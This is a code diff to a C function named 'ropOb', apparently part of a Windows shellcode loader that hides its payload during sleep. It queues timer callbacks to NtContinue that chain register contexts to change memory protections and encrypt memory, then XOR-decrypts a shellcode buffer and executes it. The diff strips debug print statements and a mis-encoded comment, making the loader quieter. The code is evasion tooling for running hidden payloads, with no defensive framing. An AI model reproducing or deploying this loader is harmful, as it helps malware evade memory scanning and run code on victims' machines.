@@ -159,19 +159,16 @@ VOID ropOb(DWORD SleepTime) {
 
         //shellcode decrypt
         RopExecuteShellcode.Rsp -= 8;
-        *((DWORD64*)RopExecuteShellcode.Rsp) = (DWORD64)(RopExecuteShellcode.Rip + 16); // ���ص�ַ��ָ����ܺ�� shellcode
+        *((DWORD64*)RopExecuteShellcode.Rsp) = (DWORD64)(RopExecuteShellcode.Rip + 16); 
         RopExecuteShellcode.Rip = (DWORD64)shellcode;
 
 
         RopExecuteShellcode.Rsp -= 8;
         RopExecuteShellcode.Rip = (DWORD64)mychar;
-        printf("\b%p", RopExecuteShellcode.Rip);
 
         RopSetEvt.Rsp -= 8;
         RopSetEvt.Rip = (DWORD64)SetEvent;
         RopSetEvt.Rcx = (DWORD64)hEvent;
-
-        puts("\n[INFO] Queue timers\n");
 
         CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD);
         CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD);
@@ -180,10 +177,7 @@ VOID ropOb(DWORD SleepTime) {
         CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD);
         CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopSetEvt, 700, 0, WT_EXECUTEINTIMERTHREAD);
 
-        puts("\n[INFO] Wait for hEvent\n");
         WaitForSingleObject(hEvent, INFINITE);
-
-        puts("\n[INFO] Finished waiting for event\n");
         xor_encrypt_decrypt(mychar, len, key);
         ((void(*)())RopExecuteShellcode.Rip)();
     }
